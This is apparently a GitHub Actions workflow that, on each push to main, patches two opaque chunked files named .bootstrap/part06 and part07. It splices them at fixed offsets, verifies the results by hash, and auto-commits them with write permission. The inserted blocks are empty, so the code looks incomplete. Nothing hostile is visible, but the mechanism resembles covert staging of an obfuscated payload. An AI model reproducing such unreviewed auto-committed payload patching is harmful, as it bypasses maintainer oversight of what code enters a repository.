name: Repair bootstrap payload
on:
  push:
    branches: [main]
permissions:
  contents: write
jobs:
  repair:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Repair corrupt bootstrap ranges
        shell: bash
        run: |
          test -f .bootstrap/part06 || exit 0
          python3 - <<'PY'
          from pathlib import Path
          p6=Path('.bootstrap/part06')
          p7=Path('.bootstrap/part07')
          tail6=''''''
          block3=''''''
          last28='4AWUPTt1Bv0Mb2bYwU0TX1HU6Ibp'
          s6=p6.read_text()
          if len(s6) < 10000: raise SystemExit('part06 too short')
          p6.write_text(s6[:10000]+tail6)
          s7=p7.read_text()
          if len(s7) < 15000: raise SystemExit('part07 too short')
          s7=s7[:3000]+block3+s7[4000:15000]+last28
          p7.write_text(s7)
          PY
          echo '265567ba651b6387451d8a068f1c08b66247fa5d03e72a0236f58bdb44d4c94e  .bootstrap/part06' | sha256sum -c -
          echo '08da0543a00969ec62b028926193ea89bd50b27098fcbd59a3eb02a86124a306  .bootstrap/part07' | sha256sum -c -
      - name: Commit repair
        run: |
          if git diff --quiet; then exit 0; fi
          git config user.name github-actions[bot]
          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
          git add .bootstrap/part06 .bootstrap/part07
          git commit -m 'Repair bootstrap payload chunks'
          git push